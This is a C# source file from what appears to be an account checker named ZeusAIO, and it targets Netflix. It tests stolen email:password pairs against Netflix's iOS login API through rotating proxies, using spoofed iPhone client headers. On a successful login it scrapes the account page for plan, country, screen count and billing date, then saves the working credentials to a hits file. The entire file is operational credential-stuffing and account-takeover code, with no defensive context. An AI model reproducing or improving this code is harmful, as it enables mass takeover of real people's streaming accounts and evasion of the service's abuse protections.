using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using System.Windows.Navigation;
using System.Web;
using HttpRequest = Leaf.xNet.HttpRequest;

namespace Netflix2
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                        string random = "NFAPPL-02-IPHONE7=2-" + RandomCapitalsAndDigits(64);
                        string kir = UrlEncode(random);
                        string paramsData = UrlEncode("{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"" + s[0] + "\",\"rememberMe\":\"true\",\"password\":\"" + s[1] + "\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}");
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            CookieStorage cookies = new CookieStorage();
                            req.Cookies = cookies;
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.AddHeader("X-Netflix.Argo.abTests", " ");
                            req.AddHeader("X-Netflix.client.appVersion", "11.44.0");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("X-Netflix.Argo.NFNSM", "9");
                            req.AddHeader("X-Netflix.Request.Attempt", "1");
                            req.AddHeader("X-Netflix.client.idiom", "phone");
                            req.AddHeader("X-Netflix.Request.Routing", "{\"path\":\"/nq/iosui/argo/~11.44.0/user\",\"control_tag\":\"iosui_argo_non_member\"}");
                            req.UserAgent = "Argo/11.44.0 (iPhone; iOS 12.4.3; Scale/2.00)";
                            req.AddHeader("X-Netflix.client.type", "argo");
                            req.AddHeader("Connection", "close");
                            req.AddHeader("X-Netflix.client.iosVersion", "12.4.3");
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string strResponse = req.Post(new Uri("https://ios.prod.ftl.netflix.com/iosui/user/11.44"), new BytesContent(Encoding.Default.GetBytes($"appInternalVersion=11.44.0&appVersion=11.44.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22clipsEnabled%22%3A%22false%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22seasonRenewalPostPlayEnabled%22%3A%22true%22%2C%22previewsBrandingEnabled%22%3A%22true%22%2C%22aroGalleriesEnabled%22%3A%22true%22%2C%22interactiveFeatureSugarPuffsEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22searchImageLocalizationFallbackLocales%22%3Atrue%2C%22billboardEnabled%22%3A%22true%22%2C%22searchImageLocalizationOnResultsOnly%22%3A%22false%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22characterBarOnPhoneEnabled%22%3A%22false%22%2C%22contentWarningEnabled%22%3A%22true%22%2C%22bigRowEnabled%22%3A%22true%22%2C%22interactiveFeatureAppUpdateDialogueEnabled%22%3A%22false%22%2C%22familiarityUIEnabled%22%3A%22false%22%2C%22bigrowNewUIEnabled%22%3A%22false%22%2C%22interactiveFeatureSugarPuffsPreplayEnabled%22%3A%22true%22%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22motionCharacterEnabled%22%3A%22true%22%2C%22roarEnabled%22%3A%22true%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22mobileCollectionsEnabled%22%3A%22false%22%2C%22interactiveFeatureMinecraftEnabled%22%3A%22true%22%2C%22searchImageLocalizationEnabled%22%3A%22false%22%2C%22interactiveFeatureKimmyEnabled%22%3A%22true%22%2C%22interactiveFeatureYouVsWildEnabled%22%3A%22true%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22kidsTrailers%22%3Atrue%7D&device_type=NFAPPL-02-&esn={kir}&idiom=phone&iosVersion=12.4.3&isTablet=false&kids=false&maxDeviceWidth=375&method=call&model=saget&modelType=IPHONE7-2&odpAware=true&param={paramsData}&pathFormat=graph&pixelDensity=2.0&progressive=false&responseFormat=json"))).ToString();

                            if (strResponse.Contains("memberHome"))
                            {
                                string cookieToken = Regex.Match(strResponse, "\"flwssn\":\"(.*?)\"").Groups[1].Value;
                                string capture = NetflixGetCaptures(cookieToken, cookies);
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - NETFLIX] " + s[0] + ":" + s[1] + " | " + capture, Color.Green);
                                }
                                Export.AsResult("/Netflix_hits", s[0] + ":" + s[1] + " | " + capture);
                                return false;
                            }
                            else if (strResponse.Contains("\"value\":\"incorrect_password\"},") || strResponse.Contains("unrecognized_email_consumption_only"))
                            {
                                break;
                            }
                            else
                            {
                                ZeusAIO.mainmenu.errors++;
                                goto Retry;
                            }
                              
                        }
                    }
                    catch (Exception e)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return true;
        }


        static string NetflixGetCaptures(string cookie, CookieStorage cookies)
        {
            for (int i = 0; i < 5; i++)
                while (true)
                    try
                    {
                        using (HttpRequest req = new HttpRequest())
                        {
                            string proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            //req.AddHeader("Cookie", "flwssn="+cookie);
                            req.Cookies = cookies;
                            req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                            req.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            req.AddHeader("Cache-Control", "max-age=0");
                            req.AddHeader("Connection", "keep-alive");
                            req.Referer = "https://www.netflix.com/browse";
                            req.AddHeader("Sec-Fetch-Dest", "document");
                            req.AddHeader("Sec-Fetch-Mode", "navigate");
                            req.AddHeader("Sec-Fetch-Site", "same-origin");
                            req.AddHeader("Sec-Fetch-User", "?1");
                            req.AddHeader("Upgrade-Insecure-Requests", "1");
                            req.UserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
                            string strResponse = req.Get(new Uri($"https://www.netflix.com/YourAccount")).ToString();

                            if (strResponse.Contains("currentPlanName\""))
                            {

                                string plan = Regex.Match(strResponse, "\"currentPlanName\":\"(.*?)\"").Groups[1].Value.Replace("\\u03A4\\u03C5\\u03C0\\u03B9\\u03BA\\u03CC", "Basic").Replace("B\\u00E1sico", "Basic").Replace("u57FAu672C", "Basic").Replace("Est\\u00E1ndar", "Standard").Replace("Standart", "Standard");
                                string country = Regex.Match(strResponse, "\"currentCountry\":\"(.*?)\"").Groups[1].Value;
                                string isDVD = Regex.Match(strResponse, "\"isDVD\":(.*?),").Groups[1].Value;
                                string screens = Regex.Match(strResponse, "\"maxStreams\":([0-9]*?),").Groups[1].Value;
                                string nextBillingDate = Regex.Match(strResponse, "\"nextBillingDate\":\"(.*?)\"").Groups[1].Value.Replace("\\x2F", "/").Replace("\\x20", "/");

                                return $"Plan: {plan} - Screens: {screens} - Country: {country} - DVD: {isDVD} - Next Billing: {nextBillingDate}";
                            }
                            break;
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return "Working - Failed Capture";
        }

        public static string UrlEncode(string s)
        {
            return HttpUtility.UrlEncode(s);
        }

        static Random random = new Random();
        public static string RandomCapitalsAndDigits(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}

     